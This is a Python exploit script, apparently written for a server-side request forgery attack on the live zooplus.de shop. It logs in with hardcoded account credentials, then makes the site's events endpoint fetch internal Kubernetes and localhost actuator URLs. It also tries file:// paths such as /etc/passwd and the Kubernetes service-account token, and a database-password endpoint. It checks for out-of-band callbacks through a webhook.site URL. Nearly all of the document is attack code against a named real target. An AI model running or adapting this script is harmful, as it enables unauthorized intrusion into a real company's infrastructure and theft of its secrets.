#!/usr/bin/env python3
"""
GET VISIBLE DATA - Try every method to get actual response data
"""
import requests
import re
import json
import time
import urllib3
urllib3.disable_warnings()

BASE = 'https://www.zooplus.de'
SSRF_ENDPOINT = f'{BASE}/zootopia-events/api/events/sites/1'
CREDS = {'email': 'suobup@dunkos.xyz', 'password': 'suobup@dunkos.xyzQ1'}

session = requests.Session()
session.verify = False
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    'Accept': 'application/json'
})

def login():
    print("[*] Logging in...")
    AUTH_URL = 'https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth'
    params = {
        'response_type': 'code',
        'client_id': 'shop-myzooplus-prod-zooplus',
        'redirect_uri': 'https://www.zooplus.de/web/sso-myzooplus/login',
        'state': 'pentest', 'login': 'true', 'ui_locales': 'de-DE', 'scope': 'openid'
    }
    r1 = session.get(AUTH_URL, params=params, timeout=15)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace('&amp;', '&')
        if not action.startswith('http'):
            from urllib.parse import urljoin
            action = urljoin(r1.url, action)
        r2 = session.post(action, data={'username': CREDS['email'], 'password': CREDS['password'], 'credentialId': ''}, timeout=15, allow_redirects=False)
        loc = r2.headers.get('Location', '')
        if loc:
            session.get(loc, timeout=15, allow_redirects=True)
            session.get(f'{BASE}/web/sso-myzooplus/login-successful.htm', timeout=15)
            print("[+] Logged in!")
            return True
    print("[-] Login failed")
    return False

def ssrf(url, name=""):
    try:
        r = session.post(SSRF_ENDPOINT, json={"url": url}, timeout=20)
        return {'name': name, 'url': url, 'status': r.status_code, 'len': len(r.text), 'body': r.text[:500], 'headers': dict(r.headers)}
    except Exception as e:
        return {'name': name, 'error': str(e)}

if not login():
    exit(1)

print("\n" + "="*80)
print("TRYING TO GET VISIBLE DATA IN HTTP RESPONSE")
print("="*80)

results = []
visible = []

# 1. Internal services
print("\n[1] Internal services...")
targets = [
    "http://kubernetes.default.svc/api",
    "http://kubernetes.default.svc/version", 
    "http://kubernetes.default.svc/healthz",
    "http://kubernetes.default.svc:8080/actuator/health",
    "http://kubernetes.default.svc:8080/actuator/info",
    "http://localhost:8080/health",
    "http://127.0.0.1:8080/",
]
for url in targets:
    r = ssrf(url, url.split('/')[-1])
    body = r.get('body', '')
    if len(body) > 5 and body not in ['{}', '""', 'null'] and '403 ERROR' not in body:
        print(f"  ✅ {url}: len={r['len']}")
        print(f"     DATA: {body[:150]}")
        visible.append(r)
    else:
        print(f"  ❌ {url}: len={r['len']} (empty/blocked)")
    results.append(r)
    time.sleep(0.3)

# 2. File protocol
print("\n[2] file:// protocol...")
files = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/version",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
]
for url in files:
    r = ssrf(url, url.replace('file:///', ''))
    body = r.get('body', '')
    if len(body) > 5 and body not in ['{}', '""']:
        print(f"  ✅ {url}: GOT DATA!")
        print(f"     DATA: {body[:200]}")
        visible.append(r)
    else:
        print(f"  ❌ {url}: len={r['len']}")
    results.append(r)
    time.sleep(0.3)

# 3. Different Accept headers
print("\n[3] Different Accept headers...")
for accept in ['text/plain', 'text/html', '*/*', 'application/xml']:
    session.headers['Accept'] = accept
    r = ssrf("http://kubernetes.default.svc/api", f"Accept:{accept}")
    body = r.get('body', '')
    if len(body) > 5 and body not in ['{}', '""'] and '403 ERROR' not in body:
        print(f"  ✅ Accept={accept}: len={r['len']}")
        print(f"     DATA: {body[:150]}")
        visible.append(r)
    else:
        print(f"  ❌ Accept={accept}: len={r['len']}")
    results.append(r)
session.headers['Accept'] = 'application/json'

# 4. WebSocket upgrade
print("\n[4] WebSocket URLs...")
ws_targets = [
    "ws://kubernetes.default.svc/api",
    "wss://kubernetes.default.svc/api",
    "ws://127.0.0.1:8080/",
]
for url in ws_targets:
    r = ssrf(url, url[:30])
    body = r.get('body', '')
    if len(body) > 5 and body not in ['{}', '""'] and '403 ERROR' not in body:
        print(f"  ✅ {url}: len={r['len']}")
        visible.append(r)
    else:
        print(f"  ❌ {url}: len={r['len']}")
    results.append(r)
    time.sleep(0.3)

# 5. Error-based extraction
print("\n[5] Error-based extraction...")
error_payloads = [
    "http://kubernetes.default.svc/api/v1/namespaces/{{.metadata.name}}",
    "http://kubernetes.default.svc/api/v1/secrets?fieldSelector=metadata.name%3D",
    "http://127.0.0.1:8080/actuator/env/spring.datasource.password",
]
for url in error_payloads:
    r = ssrf(url, "error-based")
    body = r.get('body', '')
    if len(body) > 10 and body not in ['{}', '""'] and '403 ERROR' not in body:
        print(f"  ✅ Error-based: len={r['len']}")
        print(f"     DATA: {body[:200]}")
        visible.append(r)
    else:
        print(f"  ❌ len={r['len']}")
    results.append(r)
    time.sleep(0.3)

# 6. OOB via webhook.site
print("\n[6] OOB callback via webhook.site...")
try:
    wr = requests.post('https://webhook.site/token', timeout=10)
    if wr.status_code == 200:
        token = wr.json()
        webhook = f"https://webhook.site/{token['uuid']}"
        print(f"  Webhook: {webhook}")
        
        payloads = [
            f"{webhook}?ssrf=confirmed",
            f"{webhook}/test",
        ]
        for p in payloads:
            r = ssrf(p, "webhook")
            print(f"  Sent: {p[:50]}... status={r.get('status')}")
            time.sleep(0.5)
        
        print("  Waiting 5s for callbacks...")
        time.sleep(5)
        
        cr = requests.get(f"https://webhook.site/token/{token['uuid']}/requests", timeout=10)
        if cr.status_code == 200:
            data = cr.json()
            if data.get('data'):
                print(f"  ✅ GOT {len(data['data'])} CALLBACKS!")
                for req in data['data']:
                    print(f"     {req.get('method')} {req.get('url')}")
                    print(f"     IP: {req.get('ip')}")
                    visible.append({'type': 'OOB', 'callback': req})
            else:
                print("  ❌ No callbacks (WAF blocks outbound)")
except Exception as e:
    print(f"  Error: {e}")

# Summary
print("\n" + "="*80)
print("SUMMARY")
print("="*80)
if visible:
    print(f"✅ Found {len(visible)} responses with VISIBLE DATA!")
    for v in visible:
        print(f"  - {v.get('name', v.get('type', 'unknown'))}")
else:
    print("❌ ALL RESPONSES ARE BLIND")
    print("   Every HTTP response body is {} or blocked")
    print("   This is architecturally a BLIND SSRF")
    print("   Data can ONLY be extracted via timing side-channel")

# Save
with open('visible_data_results.json', 'w') as f:
    json.dump({'results': results, 'visible': visible}, f, indent=2, default=str)
print("\nResults saved to visible_data_results.json")
